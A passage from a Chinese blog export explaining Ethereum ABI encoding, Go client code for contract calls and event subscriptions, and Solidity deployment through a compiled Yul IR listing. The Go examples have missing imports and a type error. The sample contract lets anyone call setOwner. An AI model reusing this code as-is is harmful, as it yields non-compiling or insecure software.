class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;event&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;inputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;getValue&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;internalType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uint256&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uint256&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stateMutability&quot;</span><span class="punctuation">:</span> <span class="string">&quot;view&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;function&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;inputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;internalType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uint256&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_value&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uint256&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;setValue&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stateMutability&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nonpayable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;function&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;inputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;value&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outputs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;internalType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uint256&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;uint256&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stateMutability&quot;</span><span class="punctuation">:</span> <span class="string">&quot;view&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;function&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<h3 id="ABI-的关键字段"><a href="#ABI-的关键字段" class="headerlink" title="ABI 的关键字段"></a>ABI 的关键字段</h3><ol>
<li><strong><code>type</code></strong><br> 定义元素的类型：<ul>
<li><code>function</code>：表示合约函数。</li>
<li><code>event</code>：表示事件。</li>
<li><code>constructor</code>：表示构造函数。</li>
<li><code>fallback</code>：表示回退函数。</li>
<li><code>receive</code>：表示接收以太币的特殊函数。</li>
</ul>
</li>
<li><strong><code>name</code></strong><br> 函数或事件的名称（不适用于匿名函数）。</li>
<li><strong><code>inputs</code></strong><br> 表示函数或事件的输入参数列表。每个参数包含：<ul>
<li><code>internalType</code>：Solidity 内部类型。</li>
<li><code>name</code>：参数名称。</li>
<li><code>type</code>：外部使用的类型（如 <code>uint256</code>）。</li>
</ul>
</li>
<li><strong><code>outputs</code></strong><br> 表示函数的返回值列表，格式与 <code>inputs</code> 相同。</li>
<li><strong><code>stateMutability</code></strong><br> 表示函数的状态：<ul>
<li><code>view</code>：只读，不修改状态。</li>
<li><code>pure</code>：不读写状态。</li>
<li><code>nonpayable</code>：不允许发送以太币。</li>
<li><code>payable</code>：允许发送以太币。</li>
</ul>
</li>
<li><strong><code>anonymous</code></strong><br> 仅适用于事件，表示事件是否匿名。</li>
</ol>
<h3 id="ABI-编码规则"><a href="#ABI-编码规则" class="headerlink" title="ABI 编码规则"></a>ABI 编码规则</h3><p>ABI 定义了调用合约函数时参数的编码方式。以下是编码的关键点：</p>
<h4 id="编码示例"><a href="#编码示例" class="headerlink" title="编码示例"></a>编码示例</h4><p>调用 <code>setValue(42)</code> 的编码过程如下：</p>
<ol>
<li>函数签名的 Keccak 哈希： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setValue(uint256) -&gt; 0x55241077</span><br></pre></td></tr></table></figure></li>
<li>参数的编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">42 -&gt; 000000000000000000000000000000000000000000000000000000000000002a</span><br></pre></td></tr></table></figure></li>
<li>完整的编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x55241077000000000000000000000000000000000000000000000000000000000000002a</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="ABI-解码规则"><a href="#ABI-解码规则" class="headerlink" title="ABI 解码规则"></a><strong>ABI 解码规则</strong></h3><p>返回值的解码也遵循 ABI 的规则。<br>例如，<code>getValue()</code> 返回 <code>42</code> 时：</p>
<ol>
<li>返回数据： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000000000000000000000000000000000000000000000000000000002a</span><br></pre></td></tr></table></figure></li>
<li>解码为 <code>42</code></li>
</ol>
<h2 id="ABI-的使用"><a href="#ABI-的使用" class="headerlink" title="ABI 的使用"></a>ABI 的使用</h2><h3 id="使用场景-1-智能合约调用"><a href="#使用场景-1-智能合约调用" class="headerlink" title="使用场景 1: 智能合约调用"></a>使用场景 1: 智能合约调用</h3><p><strong>场景描述：</strong></p>
<p>通过 Golang 使用 ABI 文件调用智能合约上的函数，例如调用只读函数或发送交易调用状态变更函数。</p>
<p><strong>代码示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;context&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;log&quot;</span><br><span class="line">	&quot;math/big&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/ethereum/go-ethereum/accounts/abi&quot;</span><br><span class="line">	&quot;github.com/ethereum/go-ethereum/accounts/abi/bind&quot;</span><br><span class="line">	&quot;github.com/ethereum/go-ethereum/ethclient&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	// 1. 连接到 Ethereum 节点</span><br><span class="line">	client, err := ethclient.Dial(&quot;https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;Failed to connect to Ethereum node: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 2. 合约地址和 ABI 定义</span><br><span class="line">	contractAddress := &quot;0xYourContractAddress&quot;</span><br><span class="line">	contractABI := `[&#123;&quot;constant&quot;:true,&quot;inputs&quot;:[],&quot;name&quot;:&quot;getValue&quot;,&quot;outputs&quot;:[&#123;&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;]`</span><br><span class="line"></span><br><span class="line">	// 3. 解析 ABI</span><br><span class="line">	parsedABI, err := abi.JSON(strings.NewReader(contractABI))</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;Failed to parse ABI: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 4. 构造合约调用</span><br><span class="line">	callOpts := &amp;bind.CallOpts&#123;Context: context.Background()&#125;</span><br><span class="line">	data, err := parsedABI.Pack(&quot;getValue&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;Failed to pack data: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 5. 调用合约</span><br><span class="line">	msg := ethereum.CallMsg&#123;</span><br><span class="line">		To:   &amp;contractAddress,</span><br><span class="line">		Data: data,</span><br><span class="line">	&#125;</span><br><span class="line">	result, err := client.CallContract(context.Background(), msg, nil)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;Failed to call contract: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 6. 解析返回值</span><br><span class="line">	var value *big.Int</span><br><span class="line">	err = parsedABI.UnpackIntoInterface(&amp;value, &quot;getValue&quot;, result)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;Failed to unpack result: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(&quot;Value: %s\n&quot;, value.String())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="关键点："><a href="#关键点：" class="headerlink" title="关键点："></a>关键点：</h4><ol>
<li>使用 <code>abi.JSON</code> 解析 ABI。</li>
<li>使用 <code>Pack</code> 将函数调用和参数编码。</li>
<li>通过 <code>CallContract</code> 调用合约。</li>
<li>使用 <code>UnpackIntoInterface</code> 解码返回值。</li>
</ol>
<h3 id="使用场景-2-监听合约事件"><a href="#使用场景-2-监听合约事件" class="headerlink" title="使用场景 2: 监听合约事件"></a>使用场景 2: 监听合约事件</h3><p><strong>场景描述：</strong></p>
<p>通过 Golang 和 ABI 监听合约事件的发生。</p>
<p><strong>代码示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;context&quot;</span><br><span class="line">	&quot;log&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com/ethereum/go-ethereum&quot;</span><br><span class="line">	&quot;github.com/ethereum/go-ethereum/accounts/abi&quot;</span><br><span class="line">	&quot;github.com/ethereum/go-ethereum/ethclient&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	// 1. 连接到 Ethereum 节点</span><br><span class="line">	client, err := ethclient.Dial(&quot;wss://mainnet.infura.io/ws/v3/YOUR_INFURA_PROJECT_ID&quot;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;Failed to connect to Ethereum node: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 2. 合约地址和事件的 ABI 定义</span><br><span class="line">	contractAddress := &quot;0xYourContractAddress&quot;</span><br><span class="line">	eventABI := `[&#123;&quot;anonymous&quot;:false,&quot;inputs&quot;:[&#123;&quot;indexed&quot;:false,&quot;name&quot;:&quot;newValue&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;ValueChanged&quot;,&quot;type&quot;:&quot;event&quot;&#125;]`</span><br><span class="line"></span><br><span class="line">	// 3. 解析事件 ABI</span><br><span class="line">	parsedABI, err := abi.JSON(strings.NewReader(eventABI))</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;Failed to parse ABI: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 4. 设置日志查询过滤器</span><br><span class="line">	query := ethereum.FilterQuery&#123;</span><br><span class="line">		Addresses: []common.Address&#123;common.HexToAddress(contractAddress)&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	logs := make(chan types.Log)</span><br><span class="line">	sub, err := client.SubscribeFilterLogs(context.Background(), query, logs)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		log.Fatalf(&quot;Failed to subscribe to logs: %v&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 5. 监听事件</span><br><span class="line">	for logEvent := range logs &#123;</span><br><span class="line">		var event struct &#123;</span><br><span class="line">			NewValue *big.Int</span><br><span class="line">		&#125;</span><br><span class="line">		err := parsedABI.UnpackIntoInterface(&amp;event, &quot;ValueChanged&quot;, logEvent.Data)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			log.Printf(&quot;Failed to unpack event: %v&quot;, err)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			log.Printf(&quot;New Value: %s&quot;, event.NewValue.String())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_ = sub // Handle subscription lifecycle as needed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="关键点：-1"><a href="#关键点：-1" class="headerlink" title="关键点："></a>关键点：</h4><ol>
<li>使用 <code>FilterQuery</code> 设置日志过滤器。</li>
<li>通过 <code>SubscribeFilterLogs</code> 监听事件。</li>
<li>使用 ABI 的 <code>UnpackIntoInterface</code> 解码事件数据。</li>
</ol>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Solidity部署和调用原理</title>
    <url>/2024/12/14/blockchain/ethereum/solidity-call-deploy-principle/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="Sample合约"><a href="#Sample合约" class="headerlink" title="Sample合约"></a>Sample合约</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Sample &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOwner() external view returns (address) &#123;</span><br><span class="line">        return owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setOwner(address _owner) public returns (bool) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用命令 <code>solc --ir -o ./ sample.sol</code> 将sol文件编译成 Sample.yul 文件，部分内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// @use-src 0:&quot;sample.sol&quot;</span><br><span class="line">object &quot;Sample_35&quot; &#123;</span><br><span class="line">    code &#123;</span><br><span class="line">        /// @src 0:58:358  &quot;contract Sample &#123;...&quot;</span><br><span class="line">        mstore(64, memoryguard(128))</span><br><span class="line">        if callvalue() &#123; revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() &#125;</span><br><span class="line"></span><br><span class="line">        constructor_Sample_35()</span><br><span class="line"></span><br><span class="line">        let _1 := allocate_unbounded()</span><br><span class="line">        codecopy(_1, dataoffset(&quot;Sample_35_deployed&quot;), datasize(&quot;Sample_35_deployed&quot;))</span><br><span class="line"></span><br><span class="line">        return(_1, datasize(&quot;Sample_35_deployed&quot;))</span><br><span class="line"></span><br><span class="line">        function allocate_unbounded() -&gt; memPtr &#123;</span><br><span class="line">            memPtr := mload(64)</span><br><span class="line">        &#125;</span><br><span class="line">        function update_storage_value_offset_0_t_address_to_t_address(slot, value_0) &#123;</span><br><span class="line">            let convertedValue_0 := convert_t_address_to_t_address(value_0)</span><br><span class="line">            sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_address(convertedValue_0)))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /// @ast-id 12</span><br><span class="line">        /// @src 0:106:155  &quot;constructor() &#123;...&quot;</span><br><span class="line">        function constructor_Sample_35() &#123;</span><br><span class="line"></span><br><span class="line">            /// @src 0:106:155  &quot;constructor() &#123;...&quot;</span><br><span class="line"></span><br><span class="line">            /// @src 0:138:148  &quot;msg.sender&quot;</span><br><span class="line">            let expr_8 := caller()</span><br><span class="line">            /// @src 0:130:148  &quot;owner = msg.sender&quot;</span><br><span class="line">            update_storage_value_offset_0_t_address_to_t_address(0x00, expr_8)</span><br><span class="line">            let expr_9 := expr_8</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        /// @src 0:58:358  &quot;contract Sample &#123;...&quot;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    /// @use-src 0:&quot;sample.sol&quot;</span><br><span class="line">    object &quot;Sample_35_deployed&quot; &#123;</span><br><span class="line">        code &#123;</span><br><span class="line">            /// @src 0:58:358  &quot;contract Sample &#123;...&quot;</span><br><span class="line">            mstore(64, memoryguard(128))</span><br><span class="line">            if iszero(lt(calldatasize(), 4))</span><br><span class="line">            &#123;</span><br><span class="line">                let selector := shift_right_224_unsigned(calldataload(0))</span><br><span class="line">                switch selector</span><br><span class="line">                case 0x13af4035</span><br><span class="line">                &#123;</span><br><span class="line">                    // setOwner(address)</span><br><span class="line">                    external_fun_setOwner_34()</span><br><span class="line">                &#125;</span><br><span class="line">                case 0x893d20e8</span><br><span class="line">                &#123;</span><br><span class="line">                    // getOwner()</span><br><span class="line">                    external_fun_getOwner_20()</span><br><span class="line">                &#125;</span><br><span class="line">                case 0x8da5cb5b</span><br><span class="line">                &#123;</span><br><span class="line">                    // owner()</span><br><span class="line">                    external_fun_owner_3()</span><br><span class="line">                &#125;</span><br><span class="line">                default &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            revert_error_42b3090547df1d2001c96683413b8cf91c1b902ef5e3cb8d9f6f304cf7446f74()</span><br><span class="line"></span><br><span class="line">            function allocate_unbounded() -&gt; memPtr &#123;</span><br><span class="line">                memPtr := mload(64)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            function external_fun_setOwner_34() &#123;</span><br><span class="line"></span><br><span class="line">                if callvalue() &#123; revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() &#125;</span><br><span class="line">                let param_0 :=  abi_decode_tuple_t_address(4, calldatasize())</span><br><span class="line">                let ret_0 :=  fun_setOwner_34(param_0)</span><br><span class="line">                let memPos := allocate_unbounded()</span><br><span class="line">                let memEnd := abi_encode_tuple_t_bool__to_t_bool__fromStack(memPos , ret_0)</span><br><span class="line">                return(memPos, sub(memEnd, memPos))</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            function abi_encode_t_address_to_t_address_fromStack(value, pos) &#123;</span><br><span class="line">                mstore(pos, cleanup_t_address(value))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            function abi_encode_tuple_t_address__to_t_address__fromStack(headStart , value0) -&gt; tail &#123;</span><br><span class="line">                tail := add(headStart, 32)</span><br><span class="line"></span><br><span class="line">                abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            function external_fun_getOwner_20() &#123;</span><br><span class="line">                if callvalue() &#123; revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() &#125;</span><br><span class="line">                abi_decode_tuple_(4, calldatasize())</span><br><span class="line">                let ret_0 :=  fun_getOwner_20()</span><br><span class="line">                let memPos := allocate_unbounded()</span><br><span class="line">                let memEnd := abi_encode_tuple_t_address__to_t_address__fromStack(memPos , ret_0)</span><br><span class="line">                return(memPos, sub(memEnd, memPos))</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            function read_from_storage_split_dynamic_t_address(slot, offset) -&gt; value &#123;</span><br><span class="line">                value := extract_from_storage_value_dynamict_address(sload(slot), offset)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            /// @ast-id 3</span><br><span class="line">            /// @src 0:80:100  &quot;address public owner&quot;</span><br><span class="line">            function getter_fun_owner_3() -&gt; ret &#123;</span><br><span class="line"></span><br><span class="line">                let slot := 0</span><br><span class="line">                let offset := 0</span><br><span class="line"></span><br><span class="line">                ret := read_from_storage_split_dynamic_t_address(slot, offset)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            /// @src 0:58:358  &quot;contract Sample &#123;...&quot;</span><br><span class="line"></span><br><span class="line">            function external_fun_owner_3() &#123;</span><br><span class="line"></span><br><span class="line">                if callvalue() &#123; revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() &#125;</span><br><span class="line">                abi_decode_tuple_(4, calldatasize())</span><br><span class="line">                let ret_0 :=  getter_fun_owner_3()</span><br><span class="line">                let memPos := allocate_unbounded()</span><br><span class="line">                let memEnd := abi_encode_tuple_t_address__to_t_address__fromStack(memPos , ret_0)</span><br><span class="line">                return(memPos, sub(memEnd, memPos))</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            function update_byte_slice_20_shift_0(value, toInsert) -&gt; result &#123;</span><br><span class="line">                let mask := 0xffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">                toInsert := shift_left_0(toInsert)</span><br><span class="line">                value := and(value, not(mask))</span><br><span class="line">                result := or(value, and(toInsert, mask))</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            function update_storage_value_offset_0_t_address_to_t_address(slot, value_0) &#123;</span><br><span class="line">                let convertedValue_0 := convert_t_address_to_t_address(value_0)</span><br><span class="line">                sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_address(convertedValue_0)))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            /// @ast-id 34</span><br><span class="line">            /// @src 0:248:356  &quot;function setOwner(address _owner) public returns (bool) &#123;...&quot;</span><br><span class="line">            function fun_setOwner_34(var__owner_22) -&gt; var__25 &#123;</span><br><span class="line">                /// @src 0:298:302  &quot;bool&quot;</span><br><span class="line">                let zero_t_bool_1 := zero_value_for_split_t_bool()</span><br><span class="line">                var__25 := zero_t_bool_1</span><br><span class="line"></span><br><span class="line">                /// @src 0:322:328  &quot;_owner&quot;</span><br><span class="line">                let _2 := var__owner_22</span><br><span class="line">                let expr_28 := _2</span><br><span class="line">                /// @src 0:314:328  &quot;owner = _owner&quot;</span><br><span class="line">                update_storage_value_offset_0_t_address_to_t_address(0x00, expr_28)</span><br><span class="line">                let expr_29 := expr_28</span><br><span class="line">                /// @src 0:345:349  &quot;true&quot;</span><br><span class="line">                let expr_31 := 0x01</span><br><span class="line">                /// @src 0:338:349  &quot;return true&quot;</span><br><span class="line">                var__25 := expr_31</span><br><span class="line">                leave</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            /// @ast-id 20</span><br><span class="line">            /// @src 0:161:242  &quot;function getOwner() external view returns (address) &#123;...&quot;</span><br><span class="line">            function fun_getOwner_20() -&gt; var__15 &#123;</span><br><span class="line">                /// @src 0:204:211  &quot;address&quot;</span><br><span class="line">                let zero_t_address_3 := zero_value_for_split_t_address()</span><br><span class="line">                var__15 := zero_t_address_3</span><br><span class="line"></span><br><span class="line">                /// @src 0:230:235  &quot;owner&quot;</span><br><span class="line">                let _4 := read_from_storage_split_offset_0_t_address(0x00)</span><br><span class="line">                let expr_17 := _4</span><br><span class="line">                /// @src 0:223:235  &quot;return owner&quot;</span><br><span class="line">                var__15 := expr_17</span><br><span class="line">                leave</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            /// @src 0:58:358  &quot;contract Sample &#123;...&quot;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data &quot;.metadata&quot; hex&quot;a2646970667358221220c3c7bfea64093019fdb0e0aaf2f6130bb86c98f28ea301dcc40713fb9f64853964736f6c634300081c0033&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>生成的 Yul 文件是基于以太坊中间表示（Intermediate Representation, IR）的代码，它介于 Solidity 源代码和 EVM 字节码之间。Yul 不是 JavaScript，而是一种低级、高效的语言，用于表示以太坊智能合约逻辑。Yul 的目标是更贴近 EVM 的执行逻辑，同时保留一定的可读性。</p>
<h3 id="顶层结构"><a href="#顶层结构" class="headerlink" title="顶层结构"></a>顶层结构</h3><p>Yul 文件包含两个主要对象：</p>
<ol>
<li><strong><code>Sample_35</code></strong>: 表示主合约的部署代码。</li>
<li><strong><code>Sample_35_deployed</code></strong>: 表示部署后的运行时代码。</li>
</ol>
<h4 id="1-Sample-35（合约部署阶段）"><a href="#1-Sample-35（合约部署阶段）" class="headerlink" title="1. Sample_35（合约部署阶段）"></a>1. <code>Sample_35</code>（合约部署阶段）</h4><ul>
<li><strong><code>code</code></strong>:<ul>
<li>执行合约的部署逻辑，将运行时代码加载到链上。</li>
<li>包含一些辅助函数，如内存分配、错误处理等。</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object &quot;Sample_35&quot; &#123;</span><br><span class="line">code &#123;</span><br><span class="line">    mstore(64, memoryguard(128))</span><br></pre></td></tr></table></figure>
<pre><code>`mstore(64, memoryguard(128))`: 初始化内存位置，指向位置 `0x40`，这是 Solidity 合约中默认的内存分配起点。
</code></pre>
<ul>
<li><strong>检查调用值</strong>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if callvalue() &#123; revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() &#125;</span><br></pre></td></tr></table></figure>

<pre><code>执行 `constructor_Sample_35()`，这是对应 Solidity 构造函数 `constructor` 的实现。
</code></pre>
<ul>
<li><strong>加载运行时代码</strong>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let _1 := allocate_unbounded()</span><br><span class="line">codecopy(_1, dataoffset(&quot;Sample_35_deployed&quot;), datasize(&quot;Sample_35_deployed&quot;))</span><br><span class="line">return(_1, datasize(&quot;Sample_35_deployed&quot;))</span><br></pre></td></tr></table></figure>

<pre><code>将 `Sample_35_deployed` 对象的代码加载到内存中，并将其返回以存储在链上。
</code></pre>
<h4 id="2-Sample-35-deployed（运行时阶段）"><a href="#2-Sample-35-deployed（运行时阶段）" class="headerlink" title="2. Sample_35_deployed（运行时阶段）"></a>2. <code>Sample_35_deployed</code>（运行时阶段）</h4><ul>
<li><strong>代码入口</strong>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object &quot;Sample_35_deployed&quot; &#123;</span><br><span class="line">    code &#123;</span><br><span class="line">        /// @src 0:58:358  &quot;contract Sample &#123;...&quot;</span><br><span class="line">        mstore(64, memoryguard(128))</span><br><span class="line"></span><br><span class="line">        if iszero(lt(calldatasize(), 4))</span><br><span class="line">        &#123;</span><br></pre></td></tr></table></figure>

<pre><code>- 如果传入的调用数据长度（`calldatasize()`）大于或等于 4，则认为是函数调用。
- 读取调用数据的前 4 个字节（`calldataload(0)`），解析为函数选择器（`selector`）。
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let selector := shift_right_224_unsigned(calldataload(0))</span><br><span class="line">switch selector</span><br><span class="line"></span><br><span class="line">case 0x13af4035</span><br><span class="line">&#123;</span><br><span class="line">    // setOwner(address)</span><br><span class="line"></span><br><span class="line">    external_fun_setOwner_34()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case 0x893d20e8</span><br><span class="line">&#123;</span><br><span class="line">    // getOwner()</span><br><span class="line"></span><br><span class="line">    external_fun_getOwner_20()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case 0x8da5cb5b</span><br><span class="line">&#123;</span><br><span class="line">    // owner()</span><br><span class="line"></span><br><span class="line">    external_fun_owner_3()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">default &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <code>switch</code> 根据函数选择器跳转到对应的外部函数实现：</p>
<pre><code>- `0x13af4035`: 对应 `setOwner(address)`。
